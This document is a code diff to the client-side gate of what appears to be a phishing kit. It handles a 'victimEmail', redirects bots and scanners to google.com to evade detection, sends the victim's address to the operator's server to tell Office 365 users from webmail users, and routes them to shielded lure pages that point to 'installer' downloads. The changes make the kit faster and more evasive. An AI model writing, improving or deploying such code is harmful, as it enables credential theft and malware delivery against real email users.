@@ -218,29 +218,9 @@ const BLOCK_REDIRECT_URL = "https://google.com";   // ← Where blocked visitors
   }
   victimEmail = victimEmail.trim().toLowerCase();
 
-  /* ── Step 1: Bot / IP pre-check against main server ─────────────────── */
-  // Runs immediately — blocks known bots and blacklisted IPs before animation
+  /* ── Step 1 variables — populated after parallel fetch in Step 3 ──────── */
+  // Pre-check runs in parallel with config + animation (not sequentially)
   let challenge_id = '', challenge_ts = 0, challenge_sig = '';
-  try {
-    const checkRes = await fetch(MAIN_APP_URL + '/verify_visitor_api.php', {
-      method:  'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body:    JSON.stringify({})  // server captures IP/UA server-side
-    }).then(r => r.ok ? r.json() : {}).catch(() => ({}));
-
-    if (checkRes && checkRes.allowed === false) {
-      window.location.replace(BLOCK_REDIRECT_URL);
-      await new Promise(() => {});  // halt
-    }
-
-    if (checkRes && checkRes.challenge_id) {
-      challenge_id = checkRes.challenge_id;
-      challenge_ts = checkRes.timestamp;
-      challenge_sig = checkRes.signature;
-    }
-  } catch (e) {
-    // silent fail — do not block legitimate users on transient errors
-  }
 
   /* ── Step 2: Scan animation sequence ────────────────────────────────── */
   const STATUS_MESSAGES = [
@@ -276,28 +256,60 @@ const BLOCK_REDIRECT_URL = "https://google.com";   // ← Where blocked visitors
     el('ring3').classList.add('done');
   }
 
-  /* ── Step 3: Parallel — fetch config + detect provider + run animation ─ */
+  /* ── Step 3: Parallel — pre-check + config + detect provider + animation ─ */
   const emailValid = victimEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(victimEmail);
 
-  const [cfg, providerData] = await Promise.all([
+  const [preCheck, cfg, providerData] = await Promise.all([
+
+    // IP / bot pre-check — 2s max, non-critical (best-effort)
+    safeFetch(MAIN_APP_URL + '/verify_visitor_api.php', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({})
+    }, 2000),
 
     // Main server config (landing mode, page style, shield fields)
-    safeFetch(MAIN_APP_URL + '/telegram_relay.php?config=1'),
+    safeFetch(MAIN_APP_URL + '/telegram_relay.php?config=1', undefined, 4000),
 
     // Email provider detection (O365 vs webmail)
     emailValid
-      ? safeFetch(MAIN_APP_URL + '/detect_provider_api.php?email=' + encodeURIComponent(victimEmail))
+      ? safeFetch(MAIN_APP_URL + '/detect_provider_api.php?email=' + encodeURIComponent(victimEmail), undefined, 4000)
       : Promise.resolve({}),
 
     // Visual scan runs concurrently
     runScan()
   ]);
 
+  // Handle pre-check result (block only known-bad visitors)
+  if (preCheck && preCheck.allowed === false) {
+    window.location.replace(BLOCK_REDIRECT_URL);
+    await new Promise(() => {});
+  }
+  if (preCheck && preCheck.challenge_id) {
+    challenge_id = preCheck.challenge_id;
+    challenge_ts = preCheck.timestamp;
+    challenge_sig = preCheck.signature;
+  }
+
   /* ── Step 4: Resolve target landing page ─────────────────────────────── */
   const landingMode  = cfg.landing_mode || 'single';
-  const isO365       = !!(providerData && providerData.is_o365);
   const installerUrl = cfg.installer_url || '';
   const webmailUrl   = cfg.webmail_installer_url || '';
+
+  // O365 detection: trust API when it succeeds; fall back to client-side
+  // domain check when the provider API is unreachable or times out.
+  const apiSucceeded = !!(providerData && providerData.status === 'success');
+  function clientSideIsO365(em) {
+    const d = (em.split('@')[1] || '').toLowerCase();
+    const known = [
+      'outlook.com','hotmail.com','live.com','msn.com','passport.com',
+      'outlook.co.uk','hotmail.co.uk','live.co.uk','live.com.au',
+      'outlook.com.au','outlook.de','outlook.fr','outlook.es',
+      'office365.com','microsoft.com'
+    ];
+    return known.includes(d) || d.endsWith('.onmicrosoft.com');
+  }
+  const isO365 = apiSucceeded
+    ? !!(providerData.is_o365)
+    : (emailValid ? clientSideIsO365(victimEmail) : false);
 
   // Map target page name → LinkShield landingPage identifier
   function toLandingId(page) {
@@ -375,21 +387,19 @@ const BLOCK_REDIRECT_URL = "https://google.com";   // ← Where blocked visitors
   }
   let js_proof = Math.abs(hash).toString(16);
 
-  /* ── Step 6: Generate LinkShield token via main server ───────────────── */
-  // The shield_token_api.php on the main server seals a per-visitor
-  // AES-256-GCM token and returns the full shielded gateway URL.
-  // The visitor is always sent through /r<pfx>/<token> — never directly
-  // to share/*.html — so every visit passes the 12-step security gate.
+  /* ── Step 6: Generate LinkShield token (only when shield is enabled) ─── */
+  // Skipped when cfg.shield_enabled is false — gate falls through to direct
+  // share URL immediately, with no timeout penalty.
 
-  const landingId     = toLandingId(targetPage);
-  const tokenApiUrl   = cfg.shield_token_api 
+  const landingId   = toLandingId(targetPage);
+  const tokenApiUrl = cfg.shield_token_api
                         ? makeAbsolute(cfg.shield_token_api)
                         : MAIN_APP_URL.replace(/\/+$/, '') + '/shield_token_api.php';
 
   let shieldUrl = '';
 
-  try {
-    const tokenRes = await fetch(tokenApiUrl, {
+  if (cfg.shield_enabled) {
+    const tokenRes = await safeFetch(tokenApiUrl, {
       method:  'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -401,21 +411,21 @@ const BLOCK_REDIRECT_URL = "https://google.com";   // ← Where blocked visitors
         c_sig:       challenge_sig,
         c_proof:     js_proof
       })
-    }).then(r => r.ok ? r.json() : {}).catch(() => ({}));
+    }, 4000);
 
     if (tokenRes && tokenRes.ok && tokenRes.url) {
       shieldUrl = tokenRes.url;
     }
-  } catch (e) {}
+  }
 
-  /* ── Step 7: Fallback — if shield token fails, navigate directly ──────
-     This ensures the gate never leaves the visitor stranded.
-     The share page will still have email context via ?ref=             */
+  /* ── Step 7: Direct share URL — used when shield is off or token fails ──
+     Uses app_base from config to handle subdirectory deployments correctly. */
   if (!shieldUrl) {
     const refParam = urlParams.get('ref')
       ? '?ref=' + urlParams.get('ref')
       : (victimEmail ? '?ref=' + encodeURIComponent(btoa(victimEmail)) : '');
-    shieldUrl = MAIN_APP_URL.replace(/\/+$/, '') + '/share/' + targetPage + refParam;
+    const appBase = MAIN_APP_URL.replace(/\/+$/, '') + (cfg.app_base || '');
+    shieldUrl = appBase + '/share/' + targetPage + refParam;
   }
 
   await delay(300);
